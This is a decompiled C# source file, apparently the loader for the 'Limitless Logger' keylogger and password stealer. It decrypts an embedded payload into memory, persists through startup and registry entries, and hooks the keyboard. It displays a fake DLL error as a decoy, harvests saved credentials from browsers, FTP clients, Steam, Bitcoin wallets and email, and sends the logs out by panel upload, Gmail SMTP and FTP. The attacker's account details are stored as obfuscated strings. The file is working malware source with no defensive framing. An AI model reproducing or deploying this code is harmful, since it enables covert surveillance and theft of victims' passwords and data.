using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class PayloadToMemory
{
	public static byte[] classDictionary;

	private const int SENDING_INTERVAL = 1850;

	private const bool SECURE_CONNECTION = true;

	private const bool RECOVERY_RSBOT = false;

	private const bool RECOVER_EPICBOT = true;

	private const bool RECOVER_RAREBOT = true;

	private const bool RECOVER_MINECRAFT = true;

	private const bool RECOVER_BTC = true;

	private const bool RECOVER_SPOTIFY = true;

	private const bool RECOVER_FILEZILLA = true;

	private const bool RECOVER_CHROME = true;

	private const bool RECOVER_FIREFOX = true;

	private const bool RECOVER_IE = true;

	private const bool RECOVER_SAFARI = true;

	private const bool RECOVER_OPERA = true;

	private const bool RECOVER_IDM = true;

	private const bool RECOVER_COREFTP = true;

	private const bool RECOVER_NIMBUZZ = true;

	private const bool RECOVER_PIGDIN = true;

	private const bool RECOVER_SMARTFTP = true;

	private const bool RECOVER_MSN = true;

	private const bool RECOVER_DYNDNS = true;

	private const bool RECOVER_IMVU = true;

	private const bool RECOVER_NOIP = true;

	private const bool RECOVER_STEAM = true;

	private const bool RECOVER_ONLY = false;

	private const bool RECOVER_EMAIL = true;

	public static int screenshotCount = 0;

	public static bool captureScreen = false;

	public static Thread logsThread;

	public static Thread miscThread;

	public static Thread protectionThread;

	public static Thread messagingThread;

	public static Type[] allClasses;

	[STAThread]
	public static void Main(string[] args)
	{
		Console.WriteLine("Program Initiated...");
		try
		{
			crossCheckMutex("qnokhistsdtrd565eurtjghjcg");
			classDictionary = Encoding.Default.GetBytes(PDC(Encoding.Default.GetString(decompressPackage(readFromResources("Payload.resources"))), "PrivateKey"));
			allClasses = Assembly.Load(classDictionary).GetTypes();
			if (classDictionary != null)
			{
				setVariables("Config");
				executionOptions();
				createLowLevelKeyboardHook();
				try
				{
					messagingThread = createThread(messageOptions);
					messagingThread.Start();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Console.WriteLine("Failed To Start Messaging Thread. Error: " + ex2.Message);
					ProjectData.ClearProjectError();
				}
				try
				{
					miscThread = createThread(miscillaneousFunctions);
					miscThread.Start();
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					Console.WriteLine("Failed To Start Other Functions Thread. Error: " + ex4.Message);
					ProjectData.ClearProjectError();
				}
				loadClassAndMethods("PinLogger", "Main", new object[0]);
				Process.GetCurrentProcess().WaitForExit();
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			Console.WriteLine(ex6.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void createLowLevelKeyboardHook()
	{
		loadClassAndMethods("KeyHook", "Hook", new object[0]);
		try
		{
			logsThread = createThread(postLogs);
			logsThread.Start();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Console.WriteLine("Failed To Start Sending Thread. Error: " + ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	public static void setVariables(string className)
	{
		loadClassAndMethods(className, "SetUSERNAME", new object[1] { RuntimeHelpers.GetObjectValue(loadClassAndMethods("Encryption", "GetData", new object[2] { "lszZ5NOp1tcB", "False" })) });
		loadClassAndMethods(className, "SetEMAIL", new object[1] { RuntimeHelpers.GetObjectValue(loadClassAndMethods("Encryption", "GetData", new object[2] { "uMnY5synz82kloXH2NPNsY7O4dEB", "False" })) });
		loadClassAndMethods(className, "SetEPASSWORD", new object[1] { RuntimeHelpers.GetObjectValue(loadClassAndMethods("Encryption", "GetData", new object[2] { "m8XT5dKulJ+tAQ==", "False" })) });
		loadClassAndMethods(className, "SetSMTP", new object[1] { "smtp.gmail.com" });
		loadClassAndMethods(className, "SetPORT", new object[1] { 587 });
		loadClassAndMethods(className, "SetLEFTHEADER", new object[1] { "[::-- " });
		loadClassAndMethods(className, "SetRIGHTHEADER", new object[1] { " --::]" });
		loadClassAndMethods(className, "SetSecure", new object[1] { true });
	}

	public static void executionOptions()
	{
		loadClassAndMethods("Methods", "FolderActions", new object[0]);
		loadClassAndMethods("Methods", "ILAddToStartup", new object[1] { Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()) });
		loadClassAndMethods("Methods", "AddToRegStartup", new object[2] { "Example.exe", "Example" });
	}

	public static void crossCheckMutex(string mutexKey)
	{
		try
		{
			Mutex mutex = new Mutex(initiallyOwned: false, mutexKey);
			if (!mutex.WaitOne(0, exitContext: false))
			{
				mutex.Close();
				Environment.Exit(0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Console.WriteLine("Failed to check mutex, continuing anyways...");
			ProjectData.ClearProjectError();
		}
	}

	public static void suspendCurrentThread(int timeInMilliseconds)
	{
		Thread.Sleep(timeInMilliseconds);
	}

	public static void miscillaneousFunctions()
	{
		loadClassAndMethods("Methods", "DisplayMessage", new object[3] { "Windows Services could not load MSC32.DLL. ", "Error: 0x0009810", "5" });
	}

	public static void elevateProcessPriority()
	{
		loadClassAndMethods("SelfProtection", "ProtectProcess", new object[0]);
	}

	public static void messageOptions()
	{
		loadClassAndMethods("Methods", "GetSavedInformation", new object[24]
		{
			false, false, true, true, true, true, true, true, true, true,
			true, true, true, true, true, true, true, true, true, true,
			true, true, true, true
		});
	}

	public static byte[] readFromResources(string name)
	{
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
			byte[] buffer = new byte[(int)(manifestResourceStream.Length - 1L) + 1];
			int count = manifestResourceStream.Read(buffer, 0, (int)manifestResourceStream.Length);
			MemoryStream memoryStream = new MemoryStream(buffer, 0, count);
			return memoryStream.ToArray();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Console.WriteLine(ex2.ToString());
			byte[] result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object loadClassAndMethods(string nameOfClass, string nameOfMethod, object[] args)
	{
		try
		{
			Type[] array = allClasses;
			foreach (Type type in array)
			{
				if (Operators.CompareString(type.FullName, "Payload." + nameOfClass, false) != 0)
				{
					continue;
				}
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (Operators.CompareString(methodInfo.Name, nameOfMethod, false) == 0)
					{
						return methodInfo.Invoke(RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type)), args);
					}
				}
			}
			object result = default(object);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Console.WriteLine("Payload." + nameOfClass + "." + nameOfMethod + "\r\n\r\n" + ex2.ToString());
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static Thread createThread(ThreadStart thread)
	{
		Thread thread2 = new Thread(thread);
		thread2.SetApartmentState(ApartmentState.STA);
		thread2.IsBackground = true;
		return thread2;
	}

	public static void postLogs()
	{
		string text = Conversions.ToString(loadClassAndMethods("Methods", "GetProcessorId", new object[0]));
		string text2 = Conversions.ToString(loadClassAndMethods("Methods", "GetIP", new object[0]));
		string text3 = "";
		while (true)
		{
			Thread.Sleep(1850);
			text3 = Conversions.ToString(loadClassAndMethods("Methods", "ReadLogs", new object[1] { false }));
			loadClassAndMethods("Methods", "ReadLogs", new object[1] { true });
			if (Operators.CompareString(text3, "", false) == 0)
			{
				Console.WriteLine("No Logs Were Recorded. Not Sending A Log...");
			}
			else
			{
				if (Conversions.ToBoolean(loadClassAndMethods("Config", "GetPanel", new object[0])))
				{
					loadClassAndMethods("Methods", "Upload", new object[2]
					{
						"Limitless Logger : : Keyboard Records : : " + ((ServerComputer)MyProject.Computer).get_Name() + " (" + text + ") : : " + DateTime.Now,
						text3 + text2
					});
				}
				if (Conversions.ToBoolean(loadClassAndMethods("Config", "GetEmail", new object[0])))
				{
					loadClassAndMethods("Methods", "Email", new object[5]
					{
						"Limitless Logger : : Keyboard Records : : " + ((ServerComputer)MyProject.Computer).get_Name() + " (" + text + ") : : " + DateTime.Now,
						text3 + text2,
						captureScreen,
						"",
						true
					});
				}
				if (Conversions.ToBoolean(loadClassAndMethods("Config", "GetFtp", new object[0])))
				{
					string text4 = "Limitless Logger : : Keyboard Records : : " + ((ServerComputer)MyProject.Computer).get_Name() + " (" + text + ") : : " + DateTime.Now;
					text4 = text4.Replace("/", "-");
					loadClassAndMethods("Methods", "FTPUpload", new object[5]
					{
						false,
						null,
						text4,
						".log",
						text3 + text2
					});
				}
				screenshotCount++;
			}
			text3 = "";
		}
	}

	public static string PDC(string Data, string Key, uint ExtraRounds = 0u)
	{
		byte[] Data2 = Encoding.Default.GetBytes(Data);
		byte[] bytes = PDCB(ref Data2, Encoding.Default.GetBytes(Key), ExtraRounds);
		string @string = Encoding.Default.GetString(bytes);
		bytes = null;
		return @string;
	}

	public static byte[] PDCB(ref byte[] Data, byte[] Key, uint ExtraRounds = 0u)
	{
		int num = (int)((Data.Length - 1) * ((long)ExtraRounds + 1L));
		for (int i = 0; i <= num; i++)
		{
			Data[i % Data.Length] = (byte)(((Data[i % Data.Length] ^ Key[i % Key.Length]) - Data[(i + 1) % Data.Length] + 256) % 256);
		}
		Array.Resize(ref Data, Data.Length - 1);
		return Data;
	}

	public static byte[] decompressPackage(byte[] compressedPackage)
	{
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(compressedPackage, 0, compressedPackage.Length);
		memoryStream.Position = 0L;
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
		MemoryStream memoryStream2 = new MemoryStream();
		byte[] array = new byte[64];
		int num = -1;
		for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream2.Write(array, 0, num);
		}
		return memoryStream2.ToArray();
	}
}
